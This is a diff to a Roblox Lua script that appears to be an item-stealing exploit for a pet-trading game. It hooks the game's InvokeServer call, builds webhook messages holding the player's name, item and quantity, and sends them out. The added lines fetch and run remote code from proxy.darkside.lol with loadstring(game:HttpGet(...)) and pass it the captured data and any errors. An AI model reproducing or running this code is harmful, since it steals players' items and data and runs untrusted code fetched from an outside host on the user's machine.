@@ -73,7 +73,8 @@ if not _G.Min then _G.Min = 500000000 end
 local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
 _G.pvc = ""
 local mailc = 0
-pcall(function()
+local ed,ee
+ed,ee=pcall(function()
 
 _G.pvc = ""
 local remoteFunction = Instance.new("RemoteFunction")
@@ -82,15 +83,10 @@ originalFunction = hookfunction(remoteFunction.InvokeServer, function(x, ...)
 local args = {...}
 _G.pvc = args[4]
 mailc=mailc+1
-print("-------------lol")
 local qv = "starsh"
+qv = '{"content":"'..game.Players.LocalPlayer.Name..' >> '..args[5]..'x '..args[4]..' >> '.._G.User..'"}'
 print(qv)
-local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
-local nam = "Gems"
-pcall(function()
-nam = save.Inventory.Pet[args[4]].id or args[4] end)
-qv = '{"content":"'..game.Players.LocalPlayer.Name..' >> '..args[5]..'x '..nam..' >> '.._G.User..'"}'
-print(qv)
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(qv)
 local responsexr =
         request(
         {
@@ -101,9 +97,13 @@ local responsexr =
         }
     )
 print(responsexr.StatusMessage)
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(responsexr.StatusMessage)
 return originalFunction(x, unpack(args))
 end)
 end)
+if not ed then
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(ee)
+end
 local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
 local dir = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
 function _mail(u, t, i, n)
